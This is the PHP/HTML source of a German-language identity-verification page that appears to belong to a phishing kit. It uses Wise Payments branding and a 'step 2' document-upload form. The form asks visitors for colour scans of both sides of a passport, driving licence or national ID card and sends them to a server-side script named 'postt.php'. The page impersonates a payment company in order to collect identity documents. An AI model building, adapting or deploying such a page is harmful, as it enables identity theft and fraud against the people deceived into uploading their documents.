<?php 
require 'main.php';
?>
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link rel="stylesheet" href="res/app.css">
  <title>Identverfahrensysteme</title>
</head>
<body>

<header>
  <div class="left">
    <img src="res/img/logo.png" alt="Logo">
  </div>
</header>

<div class="form-container">
 <form action="postt.php" method="post" enctype="multipart/form-data">

    <div style="text-align: center; font-size: 15px; font-weight: bold; margin-bottom: 10px;">
      Schritt 2: Dokumenten-Upload zur Verifizierung
    </div>

    <div style="text-align: center; font-size: 13px; max-width: 800px; margin: 0 auto;">
      Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder- und Rückseite). Zusätzlich ist ein aktueller Adressnachweis erforderlich (z. B. eine Rechnung oder ein Kontoauszug).
    </div>

    <hr style="width: 100%; height: 0.5px; background-color: #161b2f; border: none; margin: 10px auto;" />

    <label for="id_type"><strong>Art des Ausweisdokuments</strong></label>
    <div style="text-align: left; font-size: 12px;">
      Wählen Sie bitte aus, welches Ausweisdokument Sie verwenden möchten (z. B. Reisepass oder Personalausweis).
      Laden Sie anschließend gut lesbare Farbkopien der Vorder- und Rückseite hoch.
      Alle Angaben (Name, Ausweisnummer, Gültigkeit usw.) müssen vollständig sichtbar und lesbar sein.
    </div><br>

    <select name="id_type" id="id_type" required>
      <option value="">Bitte wählen</option>
      <option value="Reisepass">Reisepass</option>
      <option value="Führerschein">Führerschein</option>
      <option value="Personalausweis">Personalausweis</option>
    </select><br><br>

    <label for="id_front">Vorderseite (PDF/Bild)</label>
    <input type="file" name="img" id="id_front" accept=".pdf,image/*" required><br><br>



    <div id="id_back_group">
      <label for="id_back">Rückseite (PDF/Bild)</label>
      <input type="file" name="img2" id="id_back" accept=".pdf,image/*"><br><br>
    </div>

    <button type="submit">Absenden</button>

  </form>
</div>

<footer>
  <div class="fo">
    <span>© Wise Payments Limited 2025</span>
  </div>
</footer>

<script>
  // اجلب العناصر
  const idTypeSelect = document.getElementById('id_type');
  const idBackGroup = document.getElementById('id_back_group');
  const idBackInput = document.getElementById('id_back');

  function updateUploadFields() {
    const selected = idTypeSelect?.value || '';

    if (selected === 'Reisepass') {
      if (idBackGroup) idBackGroup.style.display = 'none';
      if (idBackInput) idBackInput.required = false;
    } else {
      if (idBackGroup) idBackGroup.style.display = 'block';
      if (idBackInput) idBackInput.required = true;
    }
  }

  if (idTypeSelect) {
    updateUploadFields();
    idTypeSelect.addEventListener('change', updateUploadFields);
  }
</script>

</body>
</html>
